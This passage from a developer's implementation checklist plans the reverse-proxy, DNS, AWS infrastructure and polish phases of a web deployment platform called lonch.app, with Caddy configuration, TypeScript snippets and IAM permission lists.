    }))

    // 4. wait for the task to be RUNNING (~10-30s)
    const taskIp = await waitForTaskIp(service.service!.serviceArn!)

    return { serviceArn: service.service!.serviceArn!, taskIp }
  }
  ```

---

## Phase 5 — Caddy reverse proxy + wildcard TLS

### 5a. updateCaddyUpstream helper

- [ ] Create `src/shared/libs/caddy/index.ts`
  ```ts
  // Caddy has a live Admin API on port 2019 — we POST new routes without reloading
  export async function updateCaddyUpstream(slug, upstream) {
    const route = upstream.type === "STATIC"
      ? buildS3Route(slug, upstream.s3Key)
      : buildBackendRoute(slug, upstream.ip, upstream.port)

    await fetch(`http://localhost:2019/config/apps/http/servers/srv0/routes`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(route),
    })
  }
  ```
  > Caddy's Admin API accepts config changes without restarting or dropping connections.

### 5b. Caddyfile (on your server)

- [ ] Install Caddy on your EC2/VPS: `apt install caddy` or use the official install script
- [ ] Create `/etc/caddy/Caddyfile`:
  ```
  {
    admin localhost:2019
  }

  *.lonch.app {
    tls {
      dns cloudflare {env.CLOUDFLARE_API_TOKEN}
    }
    reverse_proxy {
      dynamic upstreams {
        # Caddy calls this to resolve the upstream for each request's Host header
        url http://localhost:8080/api/v1/internal/upstream?host={http.request.host}
        interval 0  # resolve on every request (our routes change on new deploys)
      }
    }
  }
  ```

### 5c. Internal upstream resolver endpoint

- [ ] Add `GET /api/v1/internal/upstream?host=slug.lonch.app`:
  ```ts
  const slug = req.query.host.replace(".lonch.app", "")
  const project = await prisma.project.findUnique({ where: { slug },
    include: { deployments: { where: { status: "SUCCESS" }, orderBy: { createdAt: "desc" }, take: 1 } }
  })
  const latest = project?.deployments[0]

  if (latest?.staticS3Key) {
    // redirect Caddy to S3 URL
    res.json({ upstreams: [{ dial: `${process.env.S3_BUCKET}.s3.amazonaws.com:443` }] })
  } else if (latest?.ecsServiceArn) {
    res.json({ upstreams: [{ dial: `${taskIp}:3000` }] })
  } else {
    res.status(404).json({ error: "No live deployment" })
  }
  ```
  > This endpoint should NOT require auth — Caddy calls it on every request

### 5d. DNS

- [ ] In Cloudflare: add wildcard A record `*.lonch.app → your server's public IP`
- [ ] Add env var on server: `CLOUDFLARE_API_TOKEN=...` (Caddy needs it for DNS-01 challenge to get the cert)
- [ ] `systemctl restart caddy` and verify the cert is issued: `curl -v https://anything.lonch.app`

---

## Phase 6 — AWS one-time setup (do before Phase 3)

- [ ] **S3**: create bucket `lonch-deployments`, block all public access
  - Static files are served via Caddy → S3, not directly from S3 URLs
- [ ] **ECR**: create repositories `lonch-build-runner` (your builder image)
- [ ] **ECS**: create cluster `lonch-cluster`, Fargate provider
- [ ] **IAM — build task role**: new role for ECS tasks with these policies:
  - `s3:PutObject` on `arn:aws:s3:::lonch-deployments/static/*`
  - `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:PutImage` etc.
  - No SQS permissions needed — signals go to Redis instead
  - No DB access, no secrets access, no other AWS permissions
- [ ] **IAM — API server role**: role your Express server uses:
  - `ecs:RunTask`, `ecs:DescribeTasks`, `ecs:StopTask`
  - `ecs:RegisterTaskDefinition`, `ecs:CreateService`, `ecs:UpdateService`
  - `s3:GetObject`, `s3:ListBucket` on your bucket
- [ ] **VPC security group for build tasks**: outbound 443 + 80 only (needs GitHub + ECR + npm registry), NO inbound
- [ ] **CloudWatch log groups**: create `/ecs/lonch-build-runner` and `/ecs/lonch-apps` manually (or let ECS auto-create)
- [ ] Enable ECR image scanning on push — good security hygiene, good talking point in interviews

---

## Phase 7 — polish

- [ ] **Env var encryption**: `crypto.createCipheriv("aes-256-gcm", key, iv)` before writing to DB, decrypt before injecting into ECS task
- [ ] **Deployment cancellation**: `POST /deployments/:id/cancel`
  - If status = QUEUED: remove from BullMQ (`deployQueue.remove(jobId)`)
  - If status = BUILDING: call `ecs.stopTask({ cluster, task: taskArn })`
  - Mark CANCELLED, publishDone
- [ ] **GitHub webhook**: `POST /api/v1/webhooks/github`
  - Verify `X-Hub-Signature-256` header (HMAC-SHA256 of the body with your webhook secret)
  - If `event = push` and branch = project's default branch → trigger deploy
- [ ] **Build cache**: in run.sh, `sha256sum package-lock.json` → check S3 for `cache/{hash}.tar.gz`
  - If hit: restore `node_modules` from S3 before install (skip npm install entirely)
  - If miss: run install normally, then upload `node_modules` as tarball to S3
  - Saves 60-80% on repeat deploys
- [ ] **Preview URLs**: each deployment gets `{deploymentId}.lonch.app` in addition to `{slug}.lonch.app`
  - Caddy upstream resolver handles both — look up by deploymentId OR slug
- [ ] **Deploy history**: `GET /api/v1/projects/:id/deployments` — paginated list
- [ ] **Kaniko**: replace Docker socket approach in build-runner with Kaniko — safer (no Docker daemon needed), required for strict security environments
- [ ] **Framework auto-detect**: in createProject, if `repoUrl` is provided, clone, read `package.json`, detect `next`/`vite`/`react-scripts`/etc., return suggested `framework` + `buildCommand` + `outputDirectory`
